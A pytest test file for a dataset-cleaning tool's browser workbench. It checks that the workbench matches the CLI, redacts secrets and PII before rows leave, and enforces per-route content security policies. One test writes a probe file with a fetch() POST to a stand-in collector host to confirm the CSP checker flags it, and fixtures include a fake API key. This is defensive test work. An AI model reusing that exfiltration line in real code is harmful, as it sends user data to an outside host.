"""The browser workbench runs this package; these tests keep it the same engine.

landing/workbench/engine/bridge.py is the only Python the page adds. It is
plain Python over the public API and the runner, so it is tested here under
CPython; scripts/workbench_e2e.mjs covers the page itself in a browser.
"""
import hashlib
import json
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

import parallelogram
from parallelogram import api

ROOT = Path(__file__).resolve().parents[2]
BENCH = ROOT / "landing/workbench"
EXAMPLES = sorted((ROOT / "cli/examples").glob("*.jsonl"))
sys.path.insert(0, str(BENCH / "engine"))
sys.path.insert(0, str(ROOT / "scripts"))

import bridge
import demo_dataset

KEY = "sk-proj-" + "aB3dE6gH9jK2mN5pQ8sT1vW4yZ7cF0hL3nR6uX9zA2dG5jM8"
RECORDS = [
    {"messages": [{"role": "user", "content": "Hi."}, {"role": "assistant", "content": "Hello."}]},
    {"messages": [{"role": "user", "content": f"My key is {KEY}"}, {"role": "assistant", "content": "Rotate it."}]},
    {"messages": [{"role": "user", "content": "Hi."}, {"role": "assistant", "content": "Hello."}]},
    {"messages": [{"role": "user", "content": "Mail me at ada.king@contoso.com"}, {"role": "assistant", "content": "Done."}]},
    {"messages": [{"role": "user", "content": "A question nobody answered"}]},
]


def lines(records):
    return "".join(json.dumps(r) + "\n" for r in records).encode()


@pytest.fixture
def bench():
    return bridge.Bench()


@pytest.fixture
def demo(tmp_path):
    train, ev = demo_dataset.build()
    (tmp_path / "train.jsonl").write_text(demo_dataset.dumps(train), encoding="utf-8")
    (tmp_path / "eval.jsonl").write_text(demo_dataset.dumps(ev), encoding="utf-8")
    b = bridge.Bench()
    b.load("train.jsonl", (tmp_path / "train.jsonl").read_bytes(), "eval.jsonl", (tmp_path / "eval.jsonl").read_bytes())
    return b, tmp_path


# ── the page ships this package, and only the part that needs no extras ──
def test_engine_archive_and_operator_page_are_current():
    done = subprocess.run([sys.executable, str(ROOT / "scripts/build_workbench.py"), "--check"],
                          capture_output=True, text=True, check=False)
    assert done.returncode == 0, done.stdout


def test_archive_runs_without_typer_rich_or_ml(tmp_path):
    with zipfile.ZipFile(BENCH / "engine/engine.zip") as z:
        names = z.namelist()
        z.extractall(tmp_path)
    assert not [n for n in names if "optimize" in n or n.endswith(("cli.py", "mcp_server.py", "terminal.py"))]
    probe = (
        "import sys, json\n"
        f"sys.path.insert(0, {str(tmp_path)!r})\n"
        "for name in ('typer', 'rich', 'torch', 'numpy', 'tokenizers', 'tiktoken'):\n"
        "    sys.modules[name] = None\n"            # importing any of them now raises
        "import bridge, parallelogram\n"
        f"assert parallelogram.__file__.startswith({str(tmp_path)!r})\n"
        "snap = json.loads(bridge.call('demo'))\n"
        "print(parallelogram.__version__, snap['stage']['exit'], snap['stage']['errors'])\n")
    done = subprocess.run([sys.executable, "-I", "-c", probe], capture_output=True, text=True, check=False)
    assert done.returncode == 0, done.stderr
    assert done.stdout.split() == [parallelogram.__version__, "2", "10"]


def test_vendored_runtime_matches_its_checksums():
    folder = next((BENCH / "vendor").glob("pyodide-*"))
    assert f"./vendor/{folder.name}/" in (BENCH / "engine-worker.js").read_text()
    for row in (folder / "SHA256SUMS").read_text().splitlines():
        digest, name = row.split()
        assert hashlib.sha256((folder / name).read_bytes()).hexdigest() == digest, name


# ── the same verdict as the CLI ─────────────────────────────────────────
@pytest.mark.parametrize("path", EXAMPLES, ids=lambda p: p.name)
def test_snapshot_agrees_with_check(bench, path):
    bench.load(path.name, path.read_bytes())
    snap = bench.snapshot()
    result = api.check(path)
    want = result.to_dict()
    assert snap["stage"] == {"exit": result.exit_code, "errors": want["summary"]["errors"],
                             "warnings": want["summary"]["warnings"], "total": want["total_records"],
                             "valid": want["valid_records"]}
    # Finding by finding, on the line the CLI names.
    mine = sorted((rid, i["rule"], i["severity"], i["message"])
                  for rid in snap["ids"] for i in bench.row(rid)["issues"])
    theirs = sorted((i["line"], i["rule"], i["severity"], i["message"])
                    for i in want["issues"] if i["line"] is not None and i["severity"] != "info")
    assert mine == theirs


@pytest.mark.parametrize("path", EXAMPLES, ids=lambda p: p.name)
def test_fix_step_writes_what_check_fix_writes(bench, tmp_path, path):
    bench.load(path.name, path.read_bytes())
    bench.set_patches([{"kind": "fix_all"}])
    out = tmp_path / "out.jsonl"
    result = api.fix(path, output=out)
    assert bench.export("working") == (out.read_bytes() if out.exists() else b"")
    assert bench.cli_equivalent()["exact"] is True
    # The step's own summary is the fixer's: same records changed, same records dropped.
    entry = bench.snapshot()["ledger"][0]
    assert (entry["changed"], entry["dropped"]) == (result.report.fixed, result.report.dropped + result.report.unparseable)


def test_demo_matches_the_cli_end_to_end(demo):
    b, folder = demo
    assert b.snapshot()["stage"] == {"exit": 2, "errors": 10, "warnings": 6, "total": 2412, "valid": 2402}
    plan = b.plan()
    assert (plan["projection"]["fixed"], plan["projection"]["dropped"], plan["projection"]["emitted"]) == (7, 9, 2403)
    assert plan["unrepairable"] == [640, 1022, 1450, 1967]
    b.set_patches([{"kind": "fix_all"}])
    cli = subprocess.run([sys.executable, "-m", "parallelogram.cli", "check", "train.jsonl", "--eval", "eval.jsonl",
                          "--fix", "-o", "train.clean.jsonl"], cwd=folder, capture_output=True, check=False)
    assert cli.returncode == 1
    assert b.export("working") == (folder / "train.clean.jsonl").read_bytes()
    assert b.snapshot()["stage"]["exit"] == 0
    assert b.cli_equivalent() == {"exact": True,
                                  "command": "parallelogram check train.jsonl --eval eval.jsonl --fix -o train.clean.jsonl"}


def test_gate_copy_is_check_output(bench, tmp_path):
    path = ROOT / "cli/examples/broken.jsonl"
    bench.load(path.name, path.read_bytes())
    out = tmp_path / "pass.jsonl"
    api.check(path, output=out)
    assert bench.export("gate") == out.read_bytes()


# ── the file the user opened is never rewritten behind their back ───────
def test_untouched_file_exports_byte_for_byte(bench):
    raw = b'\xef\xbb\xbf{"messages":[{"role":"user","content":"a"},{"role":"assistant","content":"b"}]}\r\n\r\n' \
          b'not json\r\n{"messages":[{"role":"user","content":"c"},{"role":"assistant","content":"d"}]}'
    bench.load("crlf.jsonl", raw)
    assert bench.export("working") == raw
    bench.set_patches([{"kind": "drop", "rows": [3], "enabled": False}])
    assert bench.export("working") == raw


def test_row_ids_are_the_file_line_numbers(bench):
    raw = lines(RECORDS[:1]) + b"\n\n" + b"{broken\n" + lines(RECORDS[1:2])
    bench.load("gaps.jsonl", raw)
    snap = bench.snapshot()
    assert snap["ids"] == [1, 4, 5]                      # blank lines 2 and 3 are not records
    assert bench.row(4)["issues"][0]["message"] == "Invalid JSON"
    assert bench.row(5)["issues"][0]["rule"] == "secrets"
    bench.set_patches([{"kind": "drop", "rows": [4]}])
    row = bench.row(5)
    assert (row["id"], row["line"]) == (5, 4)            # still row 5, now on line 4 of the working file
    assert bench.row(4)["gone"] == 1 and "{broken" in bench.row(4)["raw"]


# ── steps ───────────────────────────────────────────────────────────────
def test_steps_are_reversible_and_cached(bench):
    bench.load("t.jsonl", lines(RECORDS))
    base = bench.snapshot()
    steps = [{"id": "a", "kind": "fix", "rule": "secrets"}, {"id": "b", "kind": "fix", "rule": "duplicates"},
             {"id": "c", "kind": "drop_rule", "rule": "roles"}, {"id": "d", "kind": "fix", "rule": "pii"}]
    bench.set_patches(steps)
    done = bench.snapshot()
    assert [(e["changed"], e["dropped"], e["exit"]) for e in done["ledger"]] == [(1, 0, 2), (0, 1, 2), (0, 1, 1), (1, 0, 0)]
    assert done["stage"] == {"exit": 0, "errors": 0, "warnings": 0, "total": 3, "valid": 3}
    assert done["state"] == [bridge.CLEAN, bridge.CLEAN, bridge.GONE, bridge.CLEAN, bridge.GONE]
    assert done["touched"] == [0, 1, 0, 4, 0] and done["gone"] == [0, 0, 2, 0, 3]
    first = bench._stages[1][1]
    bench.set_patches(steps[:1] + [dict(s, enabled=False) for s in steps[1:]])
    one = bench.snapshot()
    assert bench._stages[1][1] is first                  # an unchanged prefix is not recomputed
    assert one["stage"]["errors"] == base["stage"]["errors"] - 1 and one["active_patches"] == 1
    bench.set_patches([dict(s, enabled=False) for s in steps])
    again = bench.snapshot()
    for key in ("stage", "state", "mask", "gone", "touched", "classes"):
        assert again[key] == base[key], key
    assert bench.export("working") == lines(RECORDS)


def test_one_rule_fix_leaves_other_records_alone(bench):
    broken = b'{"messages": "not a list", "note": "' + KEY.encode() + b'"}\n'
    bench.load("t.jsonl", lines(RECORDS) + broken + b"{nope\n")
    bench.set_patches([{"kind": "fix", "rule": "secrets"}])
    snap = bench.snapshot()
    # `check --fix` would drop the schema-broken record and the unparseable line;
    # a step about secrets must not, and the gate must still report them.
    assert snap["ledger"][0]["dropped"] == 0 and snap["ledger"][0]["changed"] == 1
    assert snap["stage"]["total"] == 7 and snap["stage"]["exit"] == 2
    assert KEY not in bench.row(2)["raw"] and "[REDACTED_SECRET]" in bench.row(2)["raw"]
    assert KEY in bench.row(6)["raw"] and {i["rule"] for i in bench.row(6)["issues"]} >= {"schema"}


def test_rejects_what_the_engine_would(bench):
    bench.load("t.jsonl", lines(RECORDS))
    with pytest.raises(ValueError, match="no mechanical fix"):
        bench.set_patches([{"kind": "fix", "rule": "roles"}])
        bench.snapshot()
    with pytest.raises(ValueError, match="unknown patch kind"):
        bench.set_patches([{"kind": "rewrite"}])
    with pytest.raises(ValueError, match="schema"):
        bench.set_options(disable=["schema"])
    with pytest.raises(ValueError, match="unknown rule"):
        bench.set_options(disable=["vibes"])


def test_options_are_the_cli_flags(bench, tmp_path):
    long = {"messages": [{"role": "user", "content": "word " * 400}, {"role": "assistant", "content": "ok"}]}
    path = tmp_path / "t.jsonl"
    path.write_bytes(lines([long] + RECORDS))
    bench.load("t.jsonl", path.read_bytes())
    bench.set_options(max_seq_len=128, disable=["pii"])
    snap = bench.snapshot()
    want = api.check(path, max_seq_len=128, disable=["pii"])
    assert (snap["stage"]["exit"], snap["stage"]["errors"], snap["stage"]["warnings"]) == (
        want.exit_code, len(want.report.errors), len(want.report.warnings))
    assert bench.cli_equivalent()["command"] == "parallelogram check t.jsonl --max-seq-len 128 --disable pii"


# ── editing: judged before it is applied ────────────────────────────────
def test_validate_judges_a_candidate_without_applying_it(bench):
    bench.load("t.jsonl", lines(RECORDS))
    before = bench.snapshot()["stage"]
    v = bench.validate(5, json.dumps(RECORDS[4]))
    assert v["errors"] == 1 and v["issues"][0]["rule"] == "roles"
    v = bench.validate(5, "{not json")
    assert v["errors"] == 1 and v["issues"][0]["message"] == "Invalid JSON"
    v = bench.validate(5, json.dumps(RECORDS[0], indent=2))
    assert [i["message"] for i in v["issues"]] == ["Duplicate of line 1"]      # judged against the file
    assert bench.validate(1, json.dumps(RECORDS[0]))["errors"] == 0            # a record is not its own duplicate
    good = {"messages": RECORDS[4]["messages"] + [{"role": "assistant", "content": "An answer."}]}
    assert bench.validate(5, json.dumps(good, indent=2))["errors"] == 0
    assert bench.snapshot()["stage"] == before
    bench.set_patches([{"kind": "edit", "rows": {"5": json.dumps(good, indent=2)}}])
    assert bench.row(5)["issues"] == [] and "\n" not in bench.row(5)["raw"]    # written back as one line
    assert bench.snapshot()["stage"]["errors"] == before["errors"] - 1


# ── operator: what leaves, and what is allowed back ─────────────────────
def test_outbound_rows_are_redacted(demo):
    b, _ = demo
    sent = json.dumps(b.outbound([412, 1843, 2131, 2210]))
    assert "[REDACTED_SECRET]" in sent and "[REDACTED_EMAIL]" in sent and "[REDACTED_PHONE]" in sent
    for leaked in ("sk-proj-", "priya.raman", "jonas.weber", "7700 900461"):
        assert leaked not in sent
    # Findings go without the CLI's partial masks: no trailing digits, initials or key prefixes.
    assert [o["findings"] for o in json.loads(sent)] == [
        ["pii: Message 0 contains a phone number"], ["pii: Message 1 contains an email address"],
        ["secrets: Message 0 contains a likely OpenAI API key"], ["pii: Message 0 contains an email address"]]
    for fragment in ("0461", "p***", "j***", "sk-pro"):
        assert fragment not in sent
    assert b.outbound([10**9]) == []


def test_a_proposal_is_accepted_only_if_the_engine_passes_it(demo):
    b, _ = demo
    original = json.loads(b.row(640)["raw"])
    trimmed = {"messages": original["messages"][:-1]}
    invented = {"messages": original["messages"] + [{"role": "assistant", "content": "Certainly, I have sent it again."}]}
    ok, same, made_up = b.verify({"640": json.dumps(trimmed)}) + b.verify({"640": json.dumps(original)}) + \
        b.verify({"640": json.dumps(invented)})
    assert ok["ok"] and ok["added"] == 0 and 0 < ok["kept"] < 1
    assert not same["ok"] and same["issues"][0]["rule"] == "roles"
    assert made_up["ok"] and made_up["added"] > 0.1          # passes the rules; the invention is reported, not hidden
    b.set_patches([{"kind": "repair", "rows": {"640": json.dumps(trimmed)}, "model": "m", "endpoint": "localhost"}])
    snap = b.snapshot()
    assert snap["stage"]["errors"] == 9 and snap["ledger"][0]["model"] == "m"
    assert b.cli_equivalent()["exact"] is False              # a model repair has no CLI equivalent, and says so


def test_recipe_records_every_step(demo):
    b, _ = demo
    edit = json.dumps({"messages": json.loads(b.row(640)["raw"])["messages"][:-1]}, ensure_ascii=False)
    b.set_patches([{"kind": "fix", "rule": "secrets"}, {"kind": "drop", "rows": [1450], "enabled": False},
                   {"kind": "edit", "rows": {"640": edit}}, {"kind": "fix_all"}])
    recipe = json.loads(b.export("recipe"))
    assert recipe["parallelogram"] == parallelogram.__version__
    assert recipe["source"]["sha256"] == hashlib.sha256(b.base).hexdigest()
    assert [(s["step"], s["kind"], s["exit_after"]) for s in recipe["steps"]] == [(1, "fix", 2), (2, "edit", 2), (3, "fix_all", 0)]
    assert recipe["steps"][1]["rows"][0]["line"] == 640 and recipe["steps"][1]["rows"][0]["text"] == edit
    assert recipe["result"]["sha256"] == hashlib.sha256(b.export("working")).hexdigest()
    assert recipe["result"]["total"] == 2404                 # one record more than --fix alone keeps


# ── the two routes and their policies ───────────────────────────────────
def test_each_route_has_exactly_the_policy_it_needs():
    from check_csp import policies, policy_for
    from serve_landing import headers_for
    rules = policies()
    site, sealed, operator = (policy_for(p, rules) for p in ("/", "/workbench/", "/workbench/operator/"))
    assert site["script-src"] == ["'self'"] and "connect-src" not in site          # the site pages are as strict as before
    assert policy_for("/integrations.html", rules) == site
    for alias in ("/workbench", "/workbench/index.html", "/workbench/workbench.js", "/workbench/engine-worker.js",
                  "/workbench/engine/engine.zip"):
        assert policy_for(alias, rules) == sealed, alias
    for alias in ("/workbench/operator", "/workbench/operator/index.html"):
        assert policy_for(alias, rules) == operator, alias
    assert sealed["connect-src"] == ["'self'"]                                       # the dataset cannot leave
    assert "https:" in operator["connect-src"] and "http://localhost:*" in operator["connect-src"]
    for policy in (sealed, operator):
        assert policy["script-src"] == ["'self'", "'wasm-unsafe-eval'"] and policy["default-src"] == ["'none'"]
    assert headers_for("/workbench/")["X-Frame-Options"] == "DENY"                    # shared headers still apply


def test_sealed_page_never_loads_the_operator():
    page = (BENCH / "index.html").read_text()
    main = (BENCH / "workbench.js").read_text()
    assert 'data-mode="bench"' in page and "operator.js" not in page
    assert main.count("operator.js") == 1 and 'await import("/workbench/operator.js")' in main
    assert 'if (MODE !== "operator") return;' in main.split("async function openOperator")[1][:120]
    for name in ("workbench.js", "field.js", "engine-worker.js"):
        assert "http://" not in (BENCH / name).read_text() and "https://" not in (BENCH / name).read_text(), name
    assert 'data-mode="operator"' in (BENCH / "operator/index.html").read_text()


def test_csp_check_passes_and_would_catch_a_leak():
    import check_csp
    assert check_csp.main() == 0
    leak = BENCH / "zz_leak_probe.js"
    leak.write_text('fetch("https://collector.example/upload", {method: "POST"});\n')
    try:
        assert check_csp.main() == 1
    finally:
        leak.unlink()
